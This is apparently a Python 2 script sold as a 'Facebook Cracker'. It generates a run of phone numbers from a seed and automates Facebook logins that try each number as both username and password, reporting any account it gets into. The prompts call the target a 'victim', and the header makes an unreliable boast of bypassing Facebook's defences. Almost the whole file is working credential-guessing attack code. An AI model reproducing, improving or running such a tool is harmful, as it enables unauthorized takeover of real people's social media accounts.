#!usr/bin/python
#Facebook Cracker Version can crack into Facebook Database 100% without Interruption By Facebook Firewall !
#This app check if the user name and password if a facebook user are same
#The user name must be a phone number for it to work


import sys
import random
import mechanize
import cookielib
import urllib,re


GHT = '''
 
$$\    $$\$$$$$$$$\      $$$$$$$$\ $$$$$$$\           $$$$$$\  $$$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\ $$$$$$$$\ $$$$$$$\  
$$ |   $$ \__$$  __|     $$  _____|$$  __$$\         $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ | $$  |$$  _____|$$  __$$\ 
$$ |   $$ |  $$ |        $$ |      $$ |  $$ |        $$ /  \__|$$ |  $$ |$$ /  $$ |$$ /  \__|$$ |$$  / $$ |      $$ |  $$ |
\$$\  $$  |  $$ |$$$$$$\ $$$$$\    $$$$$$$\ |$$$$$$\ $$ |      $$$$$$$  |$$$$$$$$ |$$ |      $$$$$  /  $$$$$\    $$$$$$$  |
 \$$\$$  /   $$ |\______|$$  __|   $$  __$$\ \______|$$ |      $$  __$$< $$  __$$ |$$ |      $$  $$<   $$  __|   $$  __$$< 
  \$$$  /    $$ |        $$ |      $$ |  $$ |        $$ |  $$\ $$ |  $$ |$$ |  $$ |$$ |  $$\ $$ |\$$\  $$ |      $$ |  $$ |
   \$  /     $$ |        $$ |      $$$$$$$  |        \$$$$$$  |$$ |  $$ |$$ |  $$ |\$$$$$$  |$$ | \$$\ $$$$$$$$\ $$ |  $$ |
    \_/      \__|        \__|      \_______/          \______/ \__|  \__|\__|  \__| \______/ \__|  \__|\________|\__|  \__|

contact me via facebook @oghenevwegbaVT for more info if you encounter any problem
or via email: mikethankgod@gmail.com

'''
print GHT
print "Note: - This tool can check if the user name and password of the victim are same"
print "# Hit CTRL+C to quit the program"
print "# Just provide a seed phone number the app will generate the rest ^_^"
print "Note: - Phone number can be entered in different format as long as the three input are filled with just one phone number"


email = str(raw_input("# Enter |First Three Digit of Phone number|: "))
passwordlist = int(raw_input("# Enter |Middle Digit of Phone number|:  "))
last = str(raw_input("# Enter |Last Two Digits of Phone number|:  "))

number = int(raw_input("number if account "))



useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]



login = 'https://web.facebook.com/login.php?login_attempt=1&lwv=100'
home = 'https://web.facebook.com/home.php'
incorrect = 'https://www.facebook.com/login.php?login_attempt=1&lwv=120&lwc=1348028'
def attack(password,e,las):

	c = 0
	while(c < number):
		
		password +=1
                
	 	try:
		   
		     print "\n\n\n [*] aCCount number ",c+1
		     br.addheaders = [('User-agent', random.choice(useragents))]
		     site = br.open(login)
		     br.select_form(nr=0)

		     ##Facebook
		     p = str(password)
		     br.form['email'] = e+p+las
		     br.form['pass'] = e+p+las
		     br.submit()
		     log = br.geturl()
		     print "[*] user name ",e+p+las
                     print "[*] user password ", e+p+las
		     print log[25:27]
		     if log[25:27] == 'lo':
			print "wrong password"	
                     elif log[25:27] == 'ch':
			print "Blocked account"
		     else:
			
			print "\n\n\n [*] Password found .. !!"
			print "\n [*] Password : %s\n" % e+str(password)+las
			sys.exit(1)
			
		     c +=1
	 	except KeyboardInterrupt:
		    print "\n[*] Exiting program .. "
		    sys.exit(1)
	        except TypeError:
  		    password +=1
                    re_check(password)
	        except mechanize.HTTPError, e:
		    # handle http errors explicit by code
		    if int(e.code) == 500:
			# do nothing. Maybe you need to set "html" to empy string.
			pass
		    else:
			pass



def check():

    global br
    global passwords
    global emails
    global l
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
       passwords = passwordlist
       emails = email
       l = last
    except KeyboardInterrupt:
       print "\n[*] Exiting program ..\n"
       sys.exit(1)
    
    try:
        
        print " [*] Account to crack : %s" % (email)
        print " [*] Loaded :" ,email,passwords,l, "passwords"
        print " [*] Cracking, please wait ..."
	attack(passwords,emails,l)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    #try:
        #search()
        
    #except KeyboardInterrupt:
     #   print "\n [*] Exiting program ..\n"
      #  sys.exit(1)
def re_check(current_password):

    global br
    global passwords
    global emails
    global l
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
       passwords = current_password
       emails = email
       l = last
    except KeyboardInterrupt:
       print "\n[*] Exiting program ..\n"
       sys.exit(1)
    
    try:
        
        print " [*] Account to crack : %s" % (email)
        print " [*] Loaded :" ,email,passwords,l, "passwords"
        print " [*] Cracking, please wait ..."
	attack(passwords,emails,l)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    #try:
        #search()
        
    #except KeyboardInterrupt:
     #   print "\n [*] Exiting program ..\n"
      #  sys.exit(1)
def checkconnection():
	try :
		data = urllib.urlopen('https://www.google.com')
		return True
	except :
		return False


if __name__ == '__main__':
	
	if checkconnection() == True:   
    		check()
	else:
		print "\n [*] No internet connection... pls turn on your network"
     

